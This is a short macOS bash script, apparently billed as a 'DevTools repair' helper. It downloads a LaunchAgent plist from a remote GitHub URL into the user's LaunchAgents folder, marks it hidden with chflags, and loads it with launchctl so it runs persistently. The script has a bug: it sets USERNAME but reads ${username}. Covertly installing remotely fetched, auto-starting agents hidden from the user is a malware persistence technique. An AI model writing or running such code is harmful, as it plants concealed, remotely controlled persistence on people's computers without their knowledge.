#!/bin/bash
USERNAME=$(stat -f%Su /dev/console)
HOME_DIR=$(eval echo "~${username}")
file=$HOME_DIR"/Library/LaunchAgents/user.DevTools.repair.plist"

if [ ! -f "$file" ]; then
  curl -Lo $HOME_DIR"/Library/LaunchAgents/user.DevTools.repair.plist" https://raw.githubusercontent.com/jaykepeters/unio/master/user.DevTools.repair.plist
  chflags hidden $HOME_DIR"/Library/LaunchAgents/user.DevTools.repair.plist"
  launchctl load $HOME_DIR"/Library/LaunchAgents/user.DevTools.repair.plist"
else
  echo "Repair Active"
fi
